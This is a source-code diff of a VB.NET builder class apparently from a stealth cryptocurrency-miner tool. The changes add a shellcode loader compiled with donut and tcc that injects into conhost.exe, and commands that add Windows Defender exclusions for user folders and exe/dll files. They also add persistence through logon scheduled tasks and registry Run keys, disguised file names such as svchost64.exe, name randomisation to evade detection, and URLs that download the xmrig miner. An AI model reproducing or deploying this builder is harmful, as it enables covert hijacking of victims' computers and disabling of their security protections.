@@ -1,7 +1,9 @@
 ﻿Imports System.CodeDom.Compiler
 Imports System.IO
+Imports System.IO.Compression
 Imports System.Security.Cryptography
 Imports System.Text
+Imports System.Text.RegularExpressions
 Imports Microsoft.CSharp
 
 Public Class Codedom
@@ -11,7 +13,7 @@ Public Class Codedom
     Public Shared UninstallerOK As Boolean = False
     Public Shared F As Form1
 
-    Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String)
+    Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String, Optional ICOPath As String = "", Optional RequireAdministrator As Boolean = False)
         MinerOK = False
 
         Dim providerOptions = New Dictionary(Of String, String)
@@ -19,6 +21,20 @@ Public Class Codedom
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
         Dim OP As String = " /target:winexe /platform:x64 /optimize "
+
+        If Not F.FA.toggleShellcode.Checked Then
+            If RequireAdministrator Then
+                File.WriteAllBytes(Path & ".manifest", My.Resources.administrator)
+                F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
+                OP += " /win32manifest:""" + Path & ".manifest" + """"
+            End If
+
+            If Not String.IsNullOrEmpty(ICOPath) Then
+                F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
+                OP += " /win32icon:""" + ICOPath + """"
+            End If
+        End If
+
 
         With Parameters
             .GenerateExecutable = True
@@ -61,12 +77,12 @@ Public Class Codedom
                 For Each E In Results.Errors
                     MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
-                MinerOK = False
             Else
                 MinerOK = True
             End If
         End With
-
+        Try : IO.File.Delete(Path & ".manifest") : Catch : End Try
+        Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
     End Sub
 
     Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String, Optional RequireAdministrator As Boolean = False)
@@ -104,7 +120,6 @@ Public Class Codedom
                 For Each E In Results.Errors
                     MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
-                WatchdogOK = False
             Else
                 WatchdogOK = True
             End If
@@ -116,74 +131,97 @@ Public Class Codedom
 
     End Sub
 
-    Public Shared Sub LoaderCompiler(ByVal SavePath As String, ByVal ProgramBytes As Byte(), Optional ICOPath As String = "", Optional RequireAdministrator As Boolean = False)
-        LoaderOK = False
+    Public Shared Sub LoaderCompiler(ByVal SavePath As String, ByVal InputFile As String, ByVal Args As String, Optional ICOPath As String = "", Optional AssemblyData As Boolean = False, Optional RequireAdministrator As Boolean = False, Optional IsMiner As Boolean = False)
+        Try
+            LoaderOK = False
+            F.Key = F.RandomString(32)
+            Dim currentDirectory = Path.GetDirectoryName(SavePath)
+            Dim filename = Path.GetFileNameWithoutExtension(SavePath)
+            Dim paths As Dictionary(Of String, String) = New Dictionary(Of String, String)() From {
+                    {"current", currentDirectory},
+                    {"compilers", Path.Combine(currentDirectory, "Compilers")},
+                    {"compilerslog", Path.Combine(currentDirectory, "Compilers\logs")},
+                    {"windres", Path.Combine(currentDirectory, "Compilers\MinGW64\bin\windres.exe")},
+                    {"tcc", Path.Combine(currentDirectory, "Compilers\tinycc\tcc.exe")},
+                    {"donut", Path.Combine(currentDirectory, "Compilers\donut\donut.exe")},
+                    {"windreslog", Path.Combine(currentDirectory, "Compilers\logs\windres.log")},
+                    {"tcclog", Path.Combine(currentDirectory, "Compilers\logs\tcc.log")},
+                    {"donutlog", Path.Combine(currentDirectory, "Compilers\logs\donut.log")},
+                    {"manifest", Path.Combine(currentDirectory, "administrator.manifest")},
+                    {"resource.rc", Path.Combine(currentDirectory, "resource.rc")},
+                    {"resource.o", Path.Combine(currentDirectory, "resource.o")},
+                    {"loader", Path.Combine(currentDirectory, "loader.bin")},
+                    {"filename", Path.Combine(currentDirectory, filename)}
+                }
+            Dim directoryFilter = F.CheckNonASCII(SavePath)
+            If F.BuildErrorTest(directoryFilter.Length > 0, String.Format("Error: Build path ""{0}"" contains the following illegal special characters: {1}, please choose a build path without any special characters.", SavePath, String.Join("", directoryFilter))) Then Return
+            If F.BuildErrorTest(Not F.txtStartDelay.Text.All(New Func(Of Char, Boolean)(AddressOf Char.IsDigit)), "Error: Start Delay must be a number.") Then Return
 
-        Dim providerOptions = New Dictionary(Of String, String)
-        providerOptions.Add("CompilerVersion", "v4.0")
-        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
-        Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:winexe /platform:x64 /optimize "
-
-        If RequireAdministrator Then
-            File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
-            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
-            OP += " /win32manifest:""" + SavePath & ".manifest" + """"
-        End If
-
-        If F.chkIcon.Checked And Not String.IsNullOrEmpty(ICOPath) Then
-            F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
-            OP += " /win32icon:""" + ICOPath + """"
-        End If
-
-        With Parameters
-            .GenerateExecutable = True
-            .OutputAssembly = SavePath
-            .CompilerOptions = OP
-            .IncludeDebugInformation = False
-            .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
-            If F.FA.toggleEnableDebug.Checked Then
-                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
+            If Not Directory.Exists(paths("compilers")) Then
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(My.Resources.Compilers))
+                    archive.ExtractToDirectory(paths("compilers"))
+                End Using
             End If
 
-            F.txtLog.Text = F.txtLog.Text + ("Creating Loader resources..." + vbNewLine)
+            Dim sb As StringBuilder = New StringBuilder(My.Resources.Program1)
+            Dim buildResource As Boolean = Not String.IsNullOrEmpty(ICOPath) OrElse RequireAdministrator OrElse AssemblyData
 
-            Dim rand As New Random()
-            Dim Resources_Program = F.Randomi(rand.Next(5, 40))
-            Dim Resources_Loader = F.Randomi(rand.Next(5, 40))
+            If buildResource Then
+                If F.BuildErrorTest(Not String.Join("", New String() {F.num_Assembly1.Text, F.num_Assembly2.Text, F.num_Assembly3.Text, F.num_Assembly4.Text}).All(New Func(Of Char, Boolean)(AddressOf Char.IsDigit)), "Error: Assembly Version must only contain numbers.") Then Return
+                Dim resource As StringBuilder = New StringBuilder(My.Resources.resource)
+                Dim defs = ""
 
-            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
-                R.AddResource(Resources_Program, F.AES_Encryptor(ProgramBytes))
-                R.Generate()
-            End Using
+                If Not String.IsNullOrEmpty(ICOPath) Then
+                    resource.Replace("#ICON", F.ToLiteral(ICOPath))
+                    defs += " -DDefIcon"
+                End If
 
-            F.txtLog.Text = F.txtLog.Text + ("Embedding Loader resources..." + vbNewLine)
-            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
+                If RequireAdministrator Then
+                    File.WriteAllBytes(paths("manifest"), My.Resources.administrator)
+                    defs += " -DDefAdmin"
+                    sb.Replace("DefWD", "TRUE")
+                End If
 
-            Dim loaderbuilder As New StringBuilder(My.Resources.Loader)
+                If AssemblyData Then
+                    resource.Replace("#TITLE", F.ToLiteral(F.txtTitle.Text))
+                    resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtDescription.Text))
+                    resource.Replace("#COMPANY", F.ToLiteral(F.txtCompany.Text))
+                    resource.Replace("#PRODUCT", F.ToLiteral(F.txtProduct.Text))
+                    resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtCopyright.Text))
+                    resource.Replace("#TRADEMARK", F.ToLiteral(F.txtTrademark.Text))
+                    resource.Replace("#VERSION", String.Join(",", New String() {F.num_Assembly1.Text, F.num_Assembly2.Text, F.num_Assembly3.Text, F.num_Assembly4.Text}))
+                    defs += " -DDefAssembly"
+                End If
 
-            loaderbuilder.Replace("#Program", Resources_Program)
-            loaderbuilder.Replace("#LoaderRes", Resources_Loader)
-
-            ReplaceGlobals(loaderbuilder)
-
-            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, loaderbuilder.ToString())
-            If Results.Errors.Count > 0 Then
-                For Each E In Results.Errors
-                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
-                Next
-                LoaderOK = False
-            Else
-                LoaderOK = True
+                File.WriteAllText(paths("resource.rc"), resource.ToString())
+                F.RunExternalProgram("cmd", String.Format("cmd /c ""{0}"" --input resource.rc --output resource.o -O coff {1}", paths("windres"), defs), currentDirectory, paths("windreslog"))
+                File.Delete(paths("resource.rc"))
+                File.Delete(paths("manifest"))
+                If F.BuildErrorTest(Not File.Exists(paths("resource.o")), String.Format("Error: Failed at compiling resources, check the error log at {0}.", paths("windreslog"))) Then Return
             End If
 
-            If RequireAdministrator Then
-                File.Delete(SavePath & ".manifest")
-            End If
-            Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
-        End With
+            F.RunExternalProgram(paths("donut"), String.Format("""{0}"" -a 2 -f 1", InputFile), currentDirectory, paths("tcclog"))
+            Dim shellcodebytes As String = File.ReadAllText(paths("loader"), Encoding.GetEncoding("ISO-8859-1"))
+            Dim shellcode As String = F.ToLiteral(F.Cipher(shellcodebytes, F.Key))
 
+            sb.Replace("#KEY", F.Key)
+            sb.Replace("#DELAY", F.txtStartDelay.Text)
+            sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length)
+            sb.Replace("#SHELLCODE", shellcode)
+            sb.Replace("#ARGS", Args)
+            F.CipherReplace(sb, "#ENV", "SystemRoot")
+            F.CipherReplace(sb, "#TARGET", "System32\\conhost.exe")
+
+            File.WriteAllText(paths("filename") & ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"))
+            F.RunExternalProgram(paths("tcc"), String.Format("-Wall -Wl,-subsystem=windows ""{0}"" {1} -lntdll", paths("filename") & ".c", If(buildResource, "resource.o", "")), currentDirectory, paths("tcclog"))
+            File.Delete(paths("resource.o"))
+            File.Delete(paths("filename") & ".c")
+            File.Delete(paths("loader"))
+            If F.BuildErrorTest(Not File.Exists(paths("filename") & ".exe"), String.Format("Error: Failed at compiling program, check the error log at {0}.", paths("tcclog"))) Then Return
+            LoaderOK = True
+        Catch ex As Exception
+            MessageBox.Show("Error: An error occured while building the file: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
     End Sub
 
     Public Shared Sub UninstallerCompiler(ByVal SavePath As String)
@@ -223,7 +261,6 @@ Public Class Codedom
                 For Each E In Results.Errors
                     MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
-                UninstallerOK = False
             Else
                 UninstallerOK = True
             End If
@@ -237,7 +274,7 @@ Public Class Codedom
     Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
         If F.FA.toggleKillWD.Checked Then
             stringb.Replace("DefKillWD", "true")
-            stringb.Replace("#KillWDCommands", F.EncryptString("/c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit"))
+            stringb.Replace("#KillWDCommands", F.EncryptString("cmd /c powershell -Command ""Add-MpPreference -ExclusionPath @(($pwd).path, $env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force"" & powershell -Command ""Add-MpPreference -ExclusionExtension @('exe','dll') -Force"" & exit"))
         End If
 
         If F.FA.toggleEnableDebug.Checked Then
@@ -250,6 +287,10 @@ Public Class Codedom
 
         If F.toggleEnableGPU.Checked Then
             stringb.Replace("DefGPU", "true")
+        End If
+
+        If F.FA.toggleShellcode.Checked Then
+            stringb.Replace("DefShellcode", "true")
         End If
 
         If F.chkInstall.Checked Then
@@ -270,11 +311,10 @@ Public Class Codedom
 
             If F.FA.toggleInstallSystem32.Checked Then
                 stringb.Replace("DefSystem32", "true")
-                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
             Else
-                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
             End If
-
 
             If F.toggleWatchdog.Checked Then
                 stringb.Replace("DefWatchdog", "true")
@@ -283,7 +323,6 @@ Public Class Codedom
 
         If F.chkAssembly.Checked Then
             stringb.Replace("DefAssembly", "true")
-
             stringb.Replace("%Title%", F.txtTitle.Text)
             stringb.Replace("%Description%", F.txtDescription.Text)
             stringb.Replace("%Company%", F.txtCompany.Text)
@@ -296,60 +335,33 @@ Public Class Codedom
             stringb.Replace("%v4%", F.num_Assembly4.Text)
         End If
 
-        stringb.Replace("%Guid%", Guid.NewGuid.ToString)
-
         stringb.Replace("#KEY", F.AESKEY)
         stringb.Replace("#SALT", F.SALT)
         stringb.Replace("#IV", F.IV)
-        stringb.Replace("#DLLSTR", F.EncryptString("Mandark.Mandark"))
-        stringb.Replace("#DLLOAD", F.EncryptString("Load"))
-        stringb.Replace("#REGKEY", F.EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
         stringb.Replace("#SANCTAMLIBSURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=libs"))
         stringb.Replace("#SANCTAMMINERURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=xmrig"))
         stringb.Replace("#LIBSURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/libs.zip"))
         stringb.Replace("#MINERURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/xmrig.zip"))
         stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
         stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
-        stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn "))
+        stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + """ /tr ""{0}"""))
+        stringb.Replace("#REGADD", F.EncryptString("cmd /c reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + """ /t REG_SZ /F /D ""{0}"""))
+        stringb.Replace("#MINERQUERY", F.EncryptString("Select CommandLine from Win32_Process where Name='{0}'"))
+        stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"))
         stringb.Replace("#MINERID", F.EncryptString("--cinit-find-x"))
         stringb.Replace("#DROPFILE", F.EncryptString("svchost64.exe"))
         stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
         stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
+        stringb.Replace("#SCMD", F.EncryptString("cmd"))
+        stringb.Replace("#CMDSTART", F.EncryptString("cmd /c ""{0}"""))
+        stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID ""{0}"""))
 
-        stringb.Replace("RInstall", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RGetTheResource", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RGetString", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RRun", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RBaseFolder", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RCheckProc", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RInitialize", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RGetGPU", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RAES_Method", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RTruncate", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RCommandLineEncrypt", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RWDLoop", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RStart", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RLoader", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RUninstaller", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RProgram", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RExit", F.Randomi(F.rand.Next(5, 40)))
-
-        stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg3", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg4", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg5", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg6", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg7", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg8", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg9", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg10", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rarg11", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rbD", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rbD2", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rplp", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rxM", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("rcheckcount", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("startDelay", F.txtStartDelay.Text)
+
+        For Each m As Match In Regex.Matches(stringb.ToString(), "_r(.+?)_")
+            For Each c As Capture In m.Captures
+                stringb.Replace(c.Value, F.Randomi(F.rand.Next(5, 40)))
+            Next
+        Next
     End Sub
 End Class
